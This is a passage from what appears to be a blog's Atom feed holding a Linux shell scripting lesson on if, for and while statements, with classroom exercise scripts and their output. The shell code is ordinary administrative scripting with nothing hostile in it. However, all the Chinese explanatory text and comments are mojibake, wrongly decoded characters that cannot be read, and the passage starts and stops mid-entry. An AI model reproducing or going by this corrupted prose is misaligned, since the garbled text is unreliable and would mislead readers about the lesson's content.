æ•°æ®æµé‡å¯¼å‘ è¾“å…¥&apos;&apos;    ç‰¹æ®Šå­—ç¬¦å¤±æ•ˆ&quot;&quot;    ç‰¹æ®Šå­—ç¬¦æœ‰æ•ˆ``    å‘½ä»¤æ‰§è¡Œçš„ç»“æœ{}    å‘½ä»¤çš„ç»„åˆ</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;æ•™å­¦ç¯å¢ƒä»‹ç»&quot;&gt;&lt;a href=&quot;#æ•™å­¦ç¯å¢ƒä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;æ•™å­¦ç¯å¢ƒä»‹ç»&quot;&gt;&lt;/a&gt;æ•™å­¦ç¯å¢ƒä»‹ç»&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;client rhel7.2 172.25.0.10&lt;/li&gt;
&lt;li&gt;server rhel7
      
    
    </summary>
    
    
      <category term="æŠ€æœ¯åŸ¹è®­" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬æ•™ç¨‹" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="åŸ¹è®­" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts ç¬¬äºŒè¯¾ æµç¨‹æ§åˆ¶è¯­å¥</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/01_shell_flow_control_statement/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/01_shell_flow_control_statement/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.760Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>shell çš„åŸºæœ¬ç»„æˆå…ƒç´ </p><ul><li>1&gt; é­”æ³•å­—ç¬¦ â€œ #! â€: å‡ºç°åœ¨è„šæœ¬ç¬¬ä¸€è¡Œ , ç”¨äºå®šä¹‰å‘½ä»¤è§£é‡Šå™¨ã€‚</li><li>2&gt; â€œ # â€ å·å¼€å¤´çš„è¡Œ : é™¤äº†ç¬¬ä¸€è¡Œçš„é­”æ³•å­—ç¬¦ä»¥å¤– , å…¶ä»–ä»¥ â€ # â€œ å·å¼€å¤´ çš„è¡Œæ˜¯æ³¨ç¤ºã€‚è¿™äº›è¡Œä¸ä¼šè¢«è¿è¡Œ , åªæ˜¯ç»™äººé˜…è¯»ä½¿ç”¨ã€‚</li><li>3&gt; ç³»ç»Ÿå‘½ä»¤ :shell è„šæœ¬ä¸­è¿è¡Œè§£é‡Šçš„ç³»ç»Ÿå‘½ä»¤ã€‚</li><li>4&gt; å˜é‡ : è„šæœ¬è¿è¡Œè¿‡ç¨‹ä¸­æŸäº›åå¤è°ƒç”¨çš„å€¼çš„æš‚å­˜åœ°ã€‚</li><li>5&gt; æµç¨‹æ§åˆ¶è¯­å¥ : åˆ¤æ–­ , å¾ªç¯ , è·³è½¬ç­‰æµç¨‹æ§åˆ¶ã€‚</li></ul></li><li><p>æ‰§è¡Œè„šæœ¬çš„æ–¹æ³•</p><ul><li>1&gt; bash è„šæœ¬åç§° bash -x ä»¥è°ƒè¯•æ¨¡å¼æ¥è¿è¡Œè„šæœ¬</li><li>2&gt; ./ è„šæœ¬åç§° â€“&gt; éœ€è¦å¯¹è„šæœ¬æœ‰å¯æ‰§è¡Œçš„æƒé™</li></ul></li><li><p>shellçš„åŸºæœ¬è¯­æ³•</p><ul><li>æ¡ä»¶åˆ¤æ–­è¯­å¥     if test</li><li>å¾ªç¯è¯­å¥    for while unitl</li><li>å…¶ä»–æµç¨‹æ§åˆ¶     case continue break shift function</li></ul></li></ol><h3 id="åˆ¤æ–­æ¡ä»¶"><a href="#åˆ¤æ–­æ¡ä»¶" class="headerlink" title="åˆ¤æ–­æ¡ä»¶"></a>åˆ¤æ–­æ¡ä»¶</h3><p>test åˆ¤æ–­â€”â€”â€”â€”â€”man test æŸ¥çœ‹çš„ç›¸å…³çš„åˆ¤æ–­æŒ‡ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> æ•°å­—çš„åˆ¤æ–­ å­—ç¬¦çš„åˆ¤æ–­ æ–‡ä»¶çš„åˆ¤æ–­</span><br><span class="line">-gt å¤§äº -z ç©º -d æ–‡ä»¶æ˜¯ä¸æ˜¯ä¸€ä¸ªç›®å½•</span><br><span class="line">-ge å¤§äºç­‰äº =  å­—ç¬¦ç›¸ç­‰ -f æ˜¯ä¸æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶</span><br><span class="line">-lt å°äº != å­—ç¬¦ä¸ç›¸ç­‰ -e æ–‡ä»¶æ˜¯ä¸æ˜¯å­˜åœ¨</span><br><span class="line">-le å°äºç­‰äº -n éç©º </span><br><span class="line">-ne ä¸ç­‰äº -a é€»è¾‘ä¸</span><br><span class="line">-eq ç­‰äº -o é€»è¾‘æˆ–</span><br></pre></td></tr></table></figure><pre><code>æ³¨æ„ ï¼š* [ ] æ‹¬å·ä¸¤è¾¹æœ‰ç©ºæ ¼* åˆ¤æ–­ç¬¦å·ä¸¤è¾¹æœ‰ç©ºæ ¼</code></pre><h3 id="if-è¯­æ³•æ ¼å¼"><a href="#if-è¯­æ³•æ ¼å¼" class="headerlink" title="if è¯­æ³•æ ¼å¼"></a>if è¯­æ³•æ ¼å¼</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if condition--&gt;condition æŒ‡çš„æ˜¯åˆ¤æ–­çš„æ¡ä»¶</span><br><span class="line">then</span><br><span class="line">CMD1--&gt; CMD1 æŒ‡çš„æ˜¯æ»¡è¶³åˆ¤æ–­æ¡ä»¶åæ‰§è¡Œçš„è¯­å¥</span><br><span class="line">else</span><br><span class="line">CMD2--&gt; CMD2 æŒ‡çš„æ˜¯ä¸æ»¡è¶³åˆ¤æ–­æ¡ä»¶æ‰§è¡Œçš„è¯­å¥ then</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">CMD1</span><br><span class="line">elif condition</span><br><span class="line">CMD2</span><br><span class="line">else</span><br><span class="line">CMD3</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h4 id="è¯¾å ‚ç»ƒä¹ "><a href="#è¯¾å ‚ç»ƒä¹ " class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><pre><code>1. å†™ä¸€ä¸ªè„šæœ¬ï¼Œåˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨åˆ™åˆ é™¤ã€‚è‹¥ä¸å­˜åœ¨ï¼Œå°±æç¤ºä¸å­˜åœ¨ã€‚2. ä¸‰ä¸ªæ•°å­—æ¯”å¤§å°ï¼Œè¾“å‡ºæœ€å¤§çš„3. ä¸‰ä¸ªæ•°å­—æ¯”å¤§å°,å¹¶ä¸”æŒ‰ä»å¤§åˆ°å°æ’åˆ—</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[<span class="comment">#74#root@client0 ~]#cat usertest.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"plz input username:"</span> user</span><br><span class="line"><span class="keyword">if</span> id <span class="variable">$user</span> &amp;&gt; /dev/null</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">userdel -r <span class="variable">$user</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"student not exits"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">[<span class="comment">#75#root@client0 ~]#cat num.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -gt <span class="variable">$2</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -gt <span class="variable">$3</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"max is <span class="variable">$1</span>"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"max is <span class="variable">$3</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$2</span> -gt <span class="variable">$3</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"max is <span class="variable">$2</span>"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"max is <span class="variable">$3</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#&#125;</span></span><br><span class="line">[<span class="comment">#76#root@client0 ~]#bash num.sh 9 8 80</span></span><br><span class="line">max is 80</span><br><span class="line">3</span><br><span class="line">[<span class="comment">#99#root@client0 ~]#cat sort.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -ge <span class="variable">$2</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">n1=<span class="variable">$1</span></span><br><span class="line">n2=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">n1=<span class="variable">$2</span></span><br><span class="line">n2=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$n1</span> -ge <span class="variable">$3</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">max=<span class="variable">$n1</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$n2</span> -ge <span class="variable">$3</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">be=<span class="variable">$n2</span></span><br><span class="line">min=<span class="variable">$3</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">be=<span class="variable">$3</span></span><br><span class="line">min=<span class="variable">$n2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">max=<span class="variable">$3</span></span><br><span class="line">be=<span class="variable">$n1</span></span><br><span class="line">min=<span class="variable">$n2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$max</span> <span class="variable">$be</span> <span class="variable">$min</span></span><br><span class="line">[<span class="comment">#101#root@client0 ~]#bash sort.sh 3 8 1</span></span><br><span class="line">8 3 1</span><br></pre></td></tr></table></figure><h3 id="for-è¯­æ³•æ ¼å¼"><a href="#for-è¯­æ³•æ ¼å¼" class="headerlink" title="for è¯­æ³•æ ¼å¼"></a>for è¯­æ³•æ ¼å¼</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for å˜é‡ in å–å€¼èŒƒå›´</span><br><span class="line">do</span><br><span class="line">CMD</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="å–å€¼èŒƒå›´"><a href="#å–å€¼èŒƒå›´" class="headerlink" title="å–å€¼èŒƒå›´"></a>å–å€¼èŒƒå›´</h4><ul><li><p>ä»¥ç©ºæ ¼åˆ†å‰²</p><pre><code>for i in 1 2 3for i in 5 7 10for i in a b c</code></pre><p>ä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         for i in 10 11</span><br><span class="line">do</span><br><span class="line">ssh root@172.25.0.$i &quot;yum install -y wget&quot;</span><br><span class="line">done</span><br><span class="line">for i in xx uu</span><br><span class="line">do</span><br><span class="line">ls &#x2F;tmp&#x2F;$i</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p>ä»¥{}ç½—åˆ—        {1..10}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¯ä»¥ä½¿ç”¨seq$(seq 1 10)&#x3D;&#x3D;&gt;1 2 3 4 5 6 7 8 9 10</span><br><span class="line">&#96;seq 1 10&#96;</span><br><span class="line">seq 1 2 10&#x3D;&#x3D;&gt;1 3 5 7 9</span><br><span class="line">seq 10 -1 1&#x3D;&#x3D;&gt;10 9 8 7 6 5 4 3 2 1</span><br></pre></td></tr></table></figure></li></ul><h4 id="å‘½ä»¤è¡Œæ–¹å¼"><a href="#å‘½ä»¤è¡Œæ–¹å¼" class="headerlink" title="å‘½ä»¤è¡Œæ–¹å¼"></a>å‘½ä»¤è¡Œæ–¹å¼</h4><pre><code>for i in {1..10};do echo $i;done</code></pre><h4 id="è¯¾å ‚ç»ƒä¹ -1"><a href="#è¯¾å ‚ç»ƒä¹ -1" class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><ol><li>ç»Ÿè®¡å½“å‰ç³»ç»Ÿä¸€å…±æœ‰å¤šå°‘ä¸ªç”¨æˆ·ï¼Œå¹¶ä¸”å‘æ¯ä¸ªç”¨æˆ·é—®å¥½ï¼Œå±å¹•è¾“å‡ºâ€œhello $username,your uid is $uidâ€</li><li>ä¾æ¬¡å‘/var/ç›®å½•ä¸‹çš„æ¯ä¸ªæ–‡ä»¶é—®å¥½â€œhello $fileâ€ ,ç»Ÿè®¡ä¸€å…±æœ‰å¤šå°‘ä¸ªæ–‡ä»¶</li><li>è¾“å…¥ç”¨æˆ·åï¼Œå½“å‰ç³»ç»Ÿä¸­å±äºè¯¥ç”¨æˆ·çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šæ‰“å°åœ¨å±å¹•ä¸Šï¼Œå¹¶ä¸”å‘Šè¯‰ä½ æ–‡ä»¶å¤§å°è¶…è¿‡$sizeçš„æ–‡ä»¶æœ‰å“ªäº›</li><li>è®¡ç®—æŸä¸ªå‘½ä»¤æ‰§è¡Œçš„æ—¶é—´</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">[root@client47 ~]<span class="comment"># cat for1.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> ç³»ç»Ÿä¸­ä¸€å…±æœ‰ï¼š`cat /etc/passwd |wc -l`ä¸ªç”¨æˆ·</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `cut -d <span class="string">":"</span> -f 1 /etc/passwd 2&gt;/dev/null`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">username=<span class="variable">$i</span></span><br><span class="line">uid=`grep ^<span class="variable">$i</span> /etc/passwd |cut -d <span class="string">":"</span> -f 3 2&gt;/dev/null`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"hello <span class="variable">$username</span>,your uid is <span class="variable">$uid</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">[root@client47 ~]<span class="comment"># bash for1.sh</span></span><br><span class="line">ç³»ç»Ÿä¸­ä¸€å…±æœ‰ï¼š22ä¸ªç”¨æˆ·</span><br><span class="line">hello root,your uid is 0</span><br><span class="line">hello bin,your uid is 1</span><br><span class="line">hello daemon,your uid is 2</span><br><span class="line">hello adm,your uid is 3</span><br><span class="line">hello lp,your uid is 4</span><br><span class="line">hello sync,your uid is 5</span><br><span class="line">hello shutdown,your uid is 6</span><br><span class="line">hello halt,your uid is 7</span><br><span class="line">hello mail,your uid is 8</span><br><span class="line">hello operator,your uid is 11</span><br><span class="line">hello games,your uid is 12</span><br><span class="line">hello ftp,your uid is 14</span><br><span class="line">hello nobody,your uid is 99</span><br><span class="line">hello avahi-autoipd,your uid is 170</span><br><span class="line">hello systemd-bus-proxy,your uid is 999</span><br><span class="line">hello systemd-network,your uid is 998</span><br><span class="line">hello dbus,your uid is 81</span><br><span class="line">hello polkitd,your uid is 997</span><br><span class="line">hello tss,your uid is 59</span><br><span class="line">hello postfix,your uid is 89</span><br><span class="line">hello sshd,your uid is 74</span><br><span class="line">hello student,your uid is 1000</span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for2.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `ls /var/`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> hello <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> /varç›®å½•ä¸­ä¸€å…±æœ‰`ls -l /var/|wc -l`ä¸ªæ–‡ä»¶</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for2.sh</span></span><br><span class="line">hello adm</span><br><span class="line">hello cache</span><br><span class="line">hello crash</span><br><span class="line">hello db</span><br><span class="line">hello empty</span><br><span class="line">hello games</span><br><span class="line">hello gopher</span><br><span class="line">hello kerberos</span><br><span class="line">hello lib</span><br><span class="line">hello <span class="built_in">local</span></span><br><span class="line">hello lock</span><br><span class="line">hello <span class="built_in">log</span></span><br><span class="line">hello mail</span><br><span class="line">hello nis</span><br><span class="line">hello opt</span><br><span class="line">hello preserve</span><br><span class="line">hello run</span><br><span class="line">hello spool</span><br><span class="line">hello tmp</span><br><span class="line">hello yp</span><br><span class="line">/varç›®å½•ä¸­ä¸€å…±æœ‰21ä¸ªæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for3.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"è¯·è¾“å…¥ç”¨æˆ·åï¼š"</span> username</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"è¯·è¾“å…¥æ–‡ä»¶SIZEçš„æœ€å¤§å€¼ï¼š"</span> size</span><br><span class="line"></span><br><span class="line">find / -user <span class="variable">$username</span> -size +<span class="variable">$size</span> 2&gt;/dev/null</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for3.sh</span></span><br><span class="line">è¯·è¾“å…¥ç”¨æˆ·åï¼šroot</span><br><span class="line">è¯·è¾“å…¥æ–‡ä»¶SIZEçš„æœ€å¤§å€¼ï¼š500M</span><br><span class="line">/proc/kcore</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for3.sh</span></span><br><span class="line">è¯·è¾“å…¥ç”¨æˆ·åï¼šroot</span><br><span class="line">è¯·è¾“å…¥æ–‡ä»¶SIZEçš„æœ€å¤§å€¼ï¼š100M</span><br><span class="line">/proc/kcore</span><br><span class="line">/usr/lib/locale/locale-archive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for4.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"plz input CMD:"</span> cmd</span><br><span class="line">start=`date +%s`</span><br><span class="line"><span class="variable">$cmd</span> &amp;&gt; /dev/null</span><br><span class="line">end=`date +%s`</span><br><span class="line">time=$((<span class="variable">$end</span>-<span class="variable">$start</span>))</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cmd</span> æ‰§è¡Œçš„æ—¶é—´ä¸º <span class="variable">$time</span></span><br><span class="line">[root@client47 ~]<span class="comment"># bash for4.sh</span></span><br><span class="line">plz input CMD:xz -d /tmp/big.xz</span><br><span class="line">xz -d /tmp/big.xz æ‰§è¡Œçš„æ—¶é—´ä¸º 2</span><br></pre></td></tr></table></figure><h4 id="æ‹“å±•é¢˜"><a href="#æ‹“å±•é¢˜" class="headerlink" title="æ‹“å±•é¢˜"></a>æ‹“å±•é¢˜</h4><ol><li>ç”»æ–œçº¿æ­£å<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line"> *</span><br><span class="line">  *</span><br><span class="line">   *</span><br></pre></td></tr></table></figure></li><li>å†™ä¸€ä¸ª9*9ä¹˜æ³•è¡¨</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat x1.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#è¡Œæ•°ç©ºæ ¼*æ•°é‡</span></span><br><span class="line"><span class="comment">#1 0 1</span></span><br><span class="line"><span class="comment">#211</span></span><br><span class="line"><span class="comment">#321</span></span><br><span class="line"><span class="comment">#nn-11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 <span class="variable">$1</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> `seq 1 $((<span class="variable">$i</span>-1))`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">' '</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span>  <span class="string">'*'</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash x1.sh 4</span></span><br><span class="line">*</span><br><span class="line"> *</span><br><span class="line">  *</span><br><span class="line">   *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># cat x2.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#1*1=1</span></span><br><span class="line"><span class="comment">#2*1=22*2=4</span></span><br><span class="line"><span class="comment">#3*1=33*23*3</span></span><br><span class="line"><span class="comment">#9*19*29*9=</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 9`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> `seq 1 <span class="variable">$i</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">"<span class="variable">$i</span>*<span class="variable">$j</span>=<span class="variable">$(($i*$j)</span>) "</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash x2.sh</span></span><br><span class="line">1*1=1</span><br><span class="line">2*1=2 2*2=4</span><br><span class="line">3*1=3 3*2=6 3*3=9</span><br><span class="line">4*1=4 4*2=8 4*3=12 4*4=16</span><br><span class="line">5*1=5 5*2=10 5*3=15 5*4=20 5*5=25</span><br><span class="line">6*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=36</span><br><span class="line">7*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=49</span><br><span class="line">8*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=64</span><br><span class="line">9*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81</span><br></pre></td></tr></table></figure><h3 id="while-è¯­æ³•æ ¼å¼"><a href="#while-è¯­æ³•æ ¼å¼" class="headerlink" title="while è¯­æ³•æ ¼å¼"></a>while è¯­æ³•æ ¼å¼</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">while condition æŒ‡çš„æ˜¯åˆ¤æ–­çš„æ¡ä»¶</span><br><span class="line">do</span><br><span class="line">CMD</span><br><span class="line">done</span><br><span class="line">æ•°å­—çš„åˆ¤æ–­ 